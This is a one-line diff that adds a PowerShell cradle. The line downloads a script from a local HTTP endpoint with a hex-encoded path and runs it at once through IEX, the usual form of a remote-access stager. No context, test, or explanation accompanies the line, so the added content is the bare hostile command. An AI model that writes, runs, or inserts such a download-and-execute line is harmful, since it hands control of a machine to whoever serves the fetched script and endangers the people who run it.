@@ -1,0 +1,1 @@
+IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8000/api/init/4d61744e6169436861436861436861')
